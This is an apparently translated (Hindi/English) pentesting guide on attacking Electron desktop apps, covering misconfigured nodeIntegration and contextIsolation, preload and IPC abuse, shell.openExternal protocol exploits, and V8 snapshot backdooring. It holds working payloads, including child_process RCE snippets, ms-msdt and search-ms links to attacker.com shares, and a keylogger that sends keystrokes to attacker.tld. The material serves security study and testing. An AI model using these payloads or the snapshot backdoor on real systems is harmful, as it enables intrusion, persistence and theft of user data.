# Electron डेस्कटॉप ऐप्स

{{#include ../../../banners/hacktricks-training.md}}

## परिचय

Electron एक स्थानीय backend (with **NodeJS**) और frontend (**Chromium**) को जोड़ता है, हालांकि इसमें आधुनिक ब्राउज़रों के कुछ security mechanisms की कमी होती है।

आम तौर पर आप electron app का code `.asar` application के अंदर पाएँगे; code प्राप्त करने के लिए आपको इसे extract करना होगा:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Electron app के source code में, `packet.json` के अंदर आप `main.js` फ़ाइल पा सकते हैं जहाँ security configs सेट होते हैं।
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron में 2 process प्रकार हैं:

- Main Process (NodeJS तक पूर्ण पहुँच)
- Renderer Process (सुरक्षा कारणों से NodeJS की पहुँच सीमित होनी चाहिए)

![](<../../../images/image (182).png>)

एक **renderer process** एक ब्राउज़र विंडो होगा जो एक फ़ाइल लोड करेगा:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
main.js फ़ाइल के अंदर **main process** में **renderer process** की Settings **configured** की जा सकती हैं। कुछ configurations सही तरीके से सेट होने पर यह **Electron application** को RCE या अन्य vulnerabilities मिलने से रोक सकती हैं अगर **settings are correctly configured**।

Electron application Node apis के माध्यम से डिवाइस तक एक्सेस कर सकती है, हालांकि इसे रोकने के लिए configure किया जा सकता है:

- **`nodeIntegration`** - डिफ़ॉल्ट रूप से `off` होता है। अगर `on` है, तो यह renderer process से node features तक access करने की अनुमति देता है।
- **`contextIsolation`** - डिफ़ॉल्ट रूप से `on` होता है। अगर `off` है, तो main और renderer processes isolated नहीं रहते।
- **`preload`** - डिफ़ॉल्ट रूप से empty रहता है।
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - डिफ़ॉल्ट रूप से off है। यह NodeJS द्वारा किए जा सकने वाले actions को सीमित करेगा।
- Node Integration in Workers
- **`nodeIntegrationInSubframes`**- डिफ़ॉल्ट रूप से `off` होता है।
- अगर **`nodeIntegration`** **enabled** है, तो यह Electron application के भीतर उन web pages में, जो **loaded in iframes** हैं, **Node.js APIs** के उपयोग की अनुमति देगा।
- अगर **`nodeIntegration`** **disabled** है, तो preloads iframe में लोड होंगे

Example of configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
कुछ **RCE payloads** से [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### ट्रैफ़िक कैप्चर करें

start-main कॉन्फ़िगरेशन को संशोधित करें और किसी proxy का उपयोग जोड़ें, जैसे:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

यदि आप स्थानीय रूप से एक Electron App चला सकते हैं, तो संभव है कि आप इसे मनमाना javascript code निष्पादित करने के लिए मजबूर कर सकें। यह कैसे देखें:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

यदि **nodeIntegration** **on** पर सेट है, तो किसी वेब पेज का JavaScript `require()` को कॉल करके आसानी से Node.js फीचर्स का उपयोग कर सकता है। उदाहरण के लिए, Windows पर calc application चलाने का तरीका है:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

इस सेटिंग में दर्शाई गई स्क्रिप्ट **renderer में अन्य स्क्रिप्ट्स से पहले लोड** होती है, इसलिए इसके पास **Node APIs तक असीमित पहुँच** है:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
इसलिए, स्क्रिप्ट node-features को pages में export कर सकती है:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **यदि `contextIsolation` चालू है, तो यह काम नहीं करेगा**

## RCE: XSS + contextIsolation

The _**contextIsolation**_ वेब पेज स्क्रिप्ट्स और JavaScript Electron के आंतरिक कोड के बीच **अलग किए गए contexts** प्रस्तुत करता है ताकि हर कोड का JavaScript execution एक दूसरे को प्रभावित न करे। यह RCE की संभावना को खत्म करने के लिए एक आवश्यक फीचर है।

If the contexts aren't isolated an attacker can:

1. **arbitrary JavaScript in renderer** चलाया जा सकता है (XSS या बाहरी साइटों पर नेविगेशन)
2. **Overwrite the built-in method** जिसका इस्तेमाल preload या Electron के आंतरिक कोड में होता है ताकि फ़ंक्शन का नियंत्रण हासिल किया जा सके
3. **Trigger** करें **overwritten function** के उपयोग को
4. RCE?

There are 2 places where built-int methods can be overwritten: In preload code or in Electron internal code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### क्लिक इवेंट बायपास करना

यदि किसी लिंक पर क्लिक करने पर प्रतिबंध लागू होते हैं तो आप उन्हें नियमित left click की बजाय **middle click** करके बायपास कर सकते हैं
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

इन उदाहरणों के बारे में अधिक जानकारी के लिए देखें [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) और [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Electron डेस्कटॉप एप्लिकेशन को डिप्लॉय करते समय, `nodeIntegration` और `contextIsolation` के सही सेटिंग्स सुनिश्चित करना बहुत महत्वपूर्ण है। ये सेटिंग्स होने पर, main process से preload scripts या Electron के native code को लक्षित करने वाले **client-side remote code execution (RCE)** को प्रभावी ढंग से रोका जाता है।

किसी user द्वारा links के साथ इंटरैक्ट करने या new windows खोलने पर, विशिष्ट event listeners ट्रिगर होते हैं, जो application's security और functionality के लिए महत्वपूर्ण हैं:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
ये listeners डेस्कटॉप एप्लिकेशन द्वारा अपने स्वयं के **business logic** को लागू करने के लिए **ओवरराइड** किए जाते हैं। एप्लिकेशन यह मूल्यांकन करता है कि नेविगेट की गई लिंक को आंतरिक रूप से खोला जाना चाहिए या किसी बाहरी वेब ब्राउज़र में। यह निर्णय आमतौर पर एक फ़ंक्शन, `openInternally`, के जरिए लिया जाता है। यदि यह फ़ंक्शन `false` लौटाता है, तो इसका अर्थ है कि लिंक को बाहरी रूप से खोलना चाहिए, और इसके लिए `shell.openExternal` फ़ंक्शन का उपयोग किया जाता है।

**Here is a simplified pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS security best practices अनट्रस्टेड कंटेंट को `openExternal` फ़ंक्शन के साथ स्वीकार करने के खिलाफ सलाह देती हैं, क्योंकि यह विभिन्न प्रोटोकॉल के माध्यम से RCE का कारण बन सकता है। ऑपरेटिंग सिस्टम विभिन्न प्रोटोकॉल सपोर्ट करते हैं जो RCE ट्रिगर कर सकते हैं। इस विषय पर विस्तृत उदाहरणों और आगे की व्याख्या के लिए, आप [यह स्रोत](https://positive.security/blog/url-open-rce#windows-10-19042) देख सकते हैं, जिसमें Windows प्रोटोकॉल के उदाहरण शामिल हैं जो इस vulnerability का शोषण कर सकते हैं।

macos में, `openExternal` फ़ंक्शन का दुरुपयोग किसी भी मनमाने कमांड को निष्पादित करने के लिए किया जा सकता है, उदाहरण के लिए `shell.openExternal('file:///System/Applications/Calculator.app')`।

**Examples of Windows protocol exploits include:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + कमजोर preload IPC + shell.openExternal

यह vuln **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** में पाया जा सकता है।

**webviewTag** एक **deprecated feature** है जो **renderer process** में **NodeJS** के उपयोग की अनुमति देता है, इसलिए इसे निष्क्रिय कर देना चाहिए क्योंकि यह preload context के अंदर script लोड करने की अनुमति देता है, जैसे:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
इसलिए, एक attacker जो किसी arbitrary पेज को लोड करने में सफल होता है, वह उस tag का उपयोग कर **load an arbitrary preload script** कर सकता है।

यह preload script दुरुपयोग कर के एक **vulnerable IPC service (`skype-new-window`)** को कॉल करने के लिए इस्तेमाल किया गया, जो RCE पाने के लिए **`shell.openExternal`** को कॉल कर रहा था:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## आंतरिक फ़ाइलें पढ़ना: XSS + contextIsolation

**`contextIsolation` को अक्षम करने से `<webview>` टैग्स का उपयोग संभव हो जाता है**, `<iframe>` की तरह, स्थानीय फ़ाइलों को पढ़ने और exfiltrating करने के लिए। नीचे दिया गया उदाहरण दिखाता है कि इस vulnerability का उपयोग करके आंतरिक फ़ाइलों की सामग्री कैसे पढ़ी जा सकती है:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

इसके अलावा, **आंतरिक फ़ाइल पढ़ने** की एक और विधि साझा की गई है, जो Electron desktop app में एक गंभीर local file read vulnerability को उजागर करती है। इसमें application को exploit करने और डेटा को exfiltrate करने के लिए एक script inject करना शामिल है:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + पुराना chromium**

यदि एप्लिकेशन द्वारा उपयोग किया गया **chromium** **old** है और उस पर **known** **vulnerabilities** मौजूद हैं, तो उसे **exploit** करके और XSS के माध्यम से **RCE** हासिल करना संभव हो सकता है।\
आप इसका एक उदाहरण इस **writeup** में देख सकते हैं: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing के माध्यम से Internal URL regex bypass**

मान लीजिए आपने एक XSS पाया है पर आप **cannot trigger RCE or steal internal files** नहीं कर पा रहे हैं, तो आप इसे **steal credentials via phishing** के लिए इस्तेमाल कर सकते हैं।

सबसे पहले आपको यह जानना होगा कि जब आप नया URL खोलने की कोशिश करते हैं तब क्या होता है — इसके लिए front-end के JS code को चेक करें:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
The call to **`openInternally`** will decide if the **link** will be **opened** in the **desktop window** as it's a link belonging to the platform, **or** if will be opened in the **browser as a 3rd party resource**.

In the case the **regex** used by the function is **vulnerable to bypasses** (for example by **not escaping the dots of subdomains**) an attacker could abuse the XSS to **open a new window which** will be located in the attackers infrastructure **asking for credentials** to the user:

The call to **`openInternally`** यह तय करेगा कि **link** प्लेटफ़ॉर्म का होने के कारण **desktop window** में **opened** होगा या **browser as a 3rd party resource** में खोला जाएगा।

यदि फंक्शन द्वारा उपयोग किया गया **regex** **vulnerable to bypasses** है (उदाहरण के लिए **not escaping the dots of subdomains**), तो एक attacker XSS का दुरुपयोग कर सकता है और **open a new window which** attackers infrastructure में स्थित होगा और user से **asking for credentials** करेगा:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` प्रोटोकॉल

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) pages running on **`file://`** को आपके मशीन की हर फ़ाइल तक एकतरफ़ा पहुँच होती है, जिसका मतलब है कि **XSS issues can be used to load arbitrary files** from the users machine. Using a **custom protocol** ऐसे मामलों को रोकता है क्योंकि आप प्रोटोकॉल को केवल एक निश्चित फ़ाइल सेट ही सर्व करने तक सीमित कर सकते हैं।

## Remote module

The Electron Remote module allows **renderer processes to access main process APIs**, facilitating communication within an Electron application. However, enabling this module introduces significant security risks. यह एप्लिकेशन के attack surface को बढ़ा देता है, जिससे यह cross-site scripting (XSS) attacks जैसे vulnerabilities के प्रति अधिक संवेदनशील बन जाता है।

> [!TIP]
> Although the **remote** module exposes some APIs from main to renderer processes, it's not straight forward to get RCE just only abusing the components. हालांकि, ये components संवेदनशील जानकारी उजागर कर सकते हैं।

> [!WARNING]
> Many apps that still use the remote module do it in a way that **require NodeIntegration to be enabled** in the renderer process, which is a **huge security risk**.

Since Electron 14 the `remote` module of Electron might be enabled in several steops cause due to security and performance reasons it's **recommended to not use it**.

To enable it, it'd first needed to **enable it in the main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
फिर, renderer process उस module से objects इस तरह import कर सकता है:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
The **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** remote module के object **`app`** द्वारा expose किए गए कुछ रोचक **functions** बताता है:

- **`app.relaunch([options])`**
- **रीस्टार्ट करता है** एप्लिकेशन को वर्तमान instance से **बाहर निकलकर** और एक नया instance **लॉन्च** करके। उपयोगी है **ऐप अपडेट्स** या महत्वपूर्ण **स्थिति परिवर्तन** के लिए।
- **`app.setAppLogsPath([path])`**
- **परिभाषित करता है** या **बनाता है** एक डायरेक्टरी **app logs** स्टोर करने के लिए। ये logs **प्राप्त** किए जा सकते हैं या **संशोधित** किए जा सकते हैं using **`app.getPath()`** या **`app.setPath(pathName, newPath)`**।
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- वर्तमान executable को एक निर्दिष्ट **protocol** के लिए **default handler** के रूप में **रजिस्टर** करता है। आप आवश्यकता पड़ने पर एक **custom path** और **arguments** प्रदान कर सकते हैं।
- **`app.setUserTasks(tasks)`**
- **टास्क जोड़ता है** **Tasks category** में **Jump List** (on Windows)। प्रत्येक टास्क नियंत्रित कर सकता है कि app कैसे **लॉन्च** किया जाता है या कौन से **arguments** पास किए जाते हैं।
- **`app.importCertificate(options, callback)`**
- **PKCS#12 certificate** को सिस्टम के **certificate store** में इम्पोर्ट करता है (Linux only)। परिणाम को हैंडल करने के लिए एक **callback** इस्तेमाल किया जा सकता है।
- **`app.moveToApplicationsFolder([options])`**
- एप्लिकेशन को **Applications folder** (on macOS) में **स्थानांतरित** करता है। Mac उपयोगकर्ताओं के लिए एक **standard installation** सुनिश्चित करने में मदद करता है।
- **`app.setJumpList(categories)`**
- **Windows** पर एक **custom Jump List** **सेट** या **हटा** सकता है। आप **categories** निर्दिष्ट कर सकते हैं ताकि tasks उपयोगकर्ता को कैसे दिखाई दें, इसे व्यवस्थित किया जा सके।
- **`app.setLoginItemSettings(settings)`**
- यह कॉन्फ़िगर करता है कि कौन से **executables** **login** पर लॉन्च होंगे और उनके साथ कौन से **options** होंगे (macOS and Windows only).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences मॉड्यूल

Electron में system preferences तक पहुँचने और system events को emit करने के लिए यह **primary API** है। **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, और **setUserDefault** जैसे methods सभी **इस मॉड्यूल का हिस्सा** हैं।

**उदाहरण उपयोग:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **सुनता है** **native macOS notifications** को NSDistributedNotificationCenter का उपयोग करके।  
* **macOS Catalina** से पहले, आप CFNotificationCenterAddObserver को **nil** पास करके **all** distributed notifications को sniff कर सकते थे।  
* **Catalina / Big Sur** के बाद, sandboxed apps फिर भी कई घटनाओं को **subscribe** कर सकते हैं (उदा., **screen locks/unlocks**, **volume mounts**, **network activity**, आदि) नोटिफिकेशन को **by name** रजिस्टर करके।

### **getUserDefault / setUserDefault**

* **Interfaces** NSUserDefaults के साथ, जो macOS पर **application** या **global** preferences को संग्रहीत करता है।

* **getUserDefault** संवेदनशील जानकारी **retrieve** कर सकता है, जैसे **recent file locations** या **user’s geographic location**।

* **setUserDefault** इन preferences को **modify** कर सकता है, जो किसी app की **configuration** को प्रभावित कर सकते हैं।

* **older Electron versions** (v8.3.0 से पहले) में, केवल NSUserDefaults का **standard suite** ही **accessible** था।

## Shell.showItemInFolder

यह फ़ंक्शन दिए गए फ़ाइल को फ़ाइल मैनेजर में दिखाता है, जो फ़ाइल को **स्वतः execute** भी कर सकता है।

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron apps में एक **Content Security Policy (CSP)** होना चाहिए ताकि **XSS attacks** रोके जा सकें। **CSP** एक **security standard** है जो ब्राउज़र में **untrusted code** के **execution** को रोकने में मदद करता है।

यह आमतौर पर **`main.js`** फ़ाइल में या **`index.html`** टेम्पलेट में CSP को एक **meta tag** के अंदर **configured** किया जाता है।

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

यह वास्तविक-विश्व चेन Visual Studio Code 1.63 (CVE-2021-43908) को प्रभावित करती है और दिखाती है कि कैसे webview में एक single markdown-driven XSS को CSP, postMessage, और scheme handlers के गलत कॉन्फ़िगरेशन पर पूर्ण RCE में escalate किया जा सकता है। Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Attack chain overview
- First XSS via webview CSP: जनरेट की गई CSP में `style-src 'self' 'unsafe-inline'` शामिल था, जिससे `vscode-webview://` संदर्भ में inline/style-based injection की अनुमति मिली। payload ने `/stealID` पर beacon कर के target webview’s extensionId को exfiltrate किया।
- Constructing target webview URL: leaked ID का उपयोग करके `vscode-webview://<extensionId>/.../<publicUrl>` बनाया गया।
- Second XSS via postMessage trust: outer webview ने `window.postMessage` पर strict origin/type checks के बिना भरोसा किया और attacker HTML को `allowScripts: true` के साथ लोड किया।
- Local file loading via scheme/path rewriting: payload ने `file:///...` को `vscode-file://vscode-app/...` में rewrite किया और `exploit.md` को बदल कर `RCE.html` लोड किया, कमज़ोर path validation का दुरुपयोग करके privileged local resource लोड किया गया।
- RCE in Node-enabled context: लोड की गई HTML Node APIs के साथ execute हुई, जिससे OS command execution संभव हुआ।

Example RCE primitive in the final context
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```
postMessage ट्रस्ट मुद्दों पर संबंधित पढ़ाई:

{{#ref}}
../../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## **टूल्स**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) Electron-आधारित applications में misconfigurations और security anti-patterns की पहचान करने के लिए एक टूल है।
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) Electron applications के लिए Electronegativity का उपयोग करने वाला एक open source VS Code plugin है।
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) कमजोर third-party libraries की जाँच करने के लिए
- [**Electro.ng**](https://electro.ng/): आपको इसे खरीदना होगा

## लैब्स

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) आप vulnerable Electron apps को exploit करने के लिए एक लैब पा सकते हैं।

लैब में आपकी मदद करने वाले कुछ कमांड:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron and Chromium-based apps स्टार्टअप पर एक prebuilt V8 heap snapshot को deserialize करते हैं (v8_context_snapshot.bin, और वैकल्पिक रूप से browser_v8_context_snapshot.bin) ताकि हर V8 isolate (main, preload, renderer) को initialize किया जा सके। ऐतिहासिक रूप से, Electron के integrity fuses इन्हें executable content के रूप में treat नहीं करते थे, इसलिए ये fuse-based integrity enforcement और OS code-signing checks दोनों से बच जाते थे। नतीजतन, user-writable installation में snapshot को बदलने से बिना signed binaries या ASAR को modify किए ऐप के अंदर stealthy, persistent code execution संभव हो गया।

मुख्य बिंदु
- Integrity gap: EnableEmbeddedAsarIntegrityValidation और OnlyLoadAppFromAsar ASAR के अंदर app JavaScript को validate करते हैं, लेकिन ये V8 heap snapshots (CVE-2025-55305) को कवर नहीं करते थे। Chromium भी इसी तरह snapshots की integrity-check नहीं करता।
- Attack preconditions: एप्लिकेशन की installation directory में local file write की अनुमति। यह उन सिस्टम्स पर आम है जहाँ Electron apps या Chromium browsers user-writable paths में install होते हैं (e.g., %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: किसी भी isolate में attacker JavaScript का विश्वसनीय execution एक अक्सर इस्तेमाल होने वाले builtin (या “gadget”) को बदलकर संभव होता है, जिससे persistence और code-signing verification से evasion हासिल होती है।
- Affected surface: Electron apps (यहां तक कि fuses enabled होने पर भी) और वे Chromium-based browsers जो snapshots को user-writable स्थानों से load करते हैं।

Generating a malicious snapshot without building Chromium
- prebuilt electron/mksnapshot का उपयोग करके payload JS को एक snapshot में compile करें और application के v8_context_snapshot.bin को overwrite करें।

उदाहरण: न्यूनतम payload (execution साबित करने के लिए crash force करना)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (run different code in main vs. renderer)
- Main process detection: Node-only globals जैसे process.pid, process.binding(), या process.dlopen main process isolate में मौजूद होते हैं।
- Browser/renderer detection: Browser-only globals जैसे alert document context में चलने पर उपलब्ध होते हैं।

उदाहरण gadget जो एक बार main-process Node क्षमताओं की जांच करता है
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context डेटा चोरी PoC (उदा., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator workflow
1) payload.js लिखें जो एक सामान्य builtin को clobber करे (उदा., Array.isArray) और वैकल्पिक रूप से प्रति isolate branch करे।
2) Chromium स्रोतों के बिना snapshot बनाएं:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) लक्ष्य application के snapshot फाइल(ें) को overwrite करें:
- v8_context_snapshot.bin (हमेशा उपयोग होता है)
- browser_v8_context_snapshot.bin (यदि LoadBrowserProcessSpecificV8Snapshot fuse उपयोग हो रहा है)
4) एप्लिकेशन लॉन्च करें; gadget तब execute होगा जब भी चुना गया builtin उपयोग किया जाएगा।

Notes and considerations
- Integrity/signature bypass: Snapshot फाइलों को code-signing checks द्वारा native executables की तरह नहीं माना जाता और (ऐतिहासिक रूप से) वे Electron के fuses या Chromium integrity controls द्वारा कवर नहीं किए गए थे।
- Persistence: user-writable install में snapshot को बदलना आम तौर पर app restarts को सहन कर देता है और यह एक signed, legitimate app जैसा दिखता है।
- Chromium browsers: वही tampering सिद्धांत Chrome/derivatives पर लागू होता है जो user-writable लोकेशनों में इंस्टॉल होते हैं। Chrome के पास अन्य integrity mitigations हैं लेकिन यह स्पष्ट रूप से physically local attacks को अपने threat model से बाहर रखता है।

Detection and mitigations
- Snapshots को executable content के रूप में मानें और उन्हें integrity enforcement में शामिल करें (CVE-2025-55305 fix).
- केवल admin-writable install locations को प्राथमिकता दें; v8_context_snapshot.bin और browser_v8_context_snapshot.bin के लिए baseline और hashes मॉनिटर करें।
- early-runtime builtin clobbering और अनपेक्षित snapshot बदलावों का पता लगाएँ; जब deserialized snapshots अपेक्षित मानों से मेल नहीं खाते तो alert करें।

## **References**

- [SecureLayer7: Electron Research in Desktop apps (Part 1)](https://blog.securelayer7.net/electron-app-security-risks/)
- [VS Code RCE PoC (CVE-2021-43908) – electrovolt](https://github.com/Sudistark/vscode-rce-electrovolt)
- [GitHub Advisory GHSA-2q4g-w47c-4674 (CVE-2020-15174)](https://github.com/advisories/GHSA-2q4g-w47c-4674)
- [MSRC: CVE-2021-43908](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908)
- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)
- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
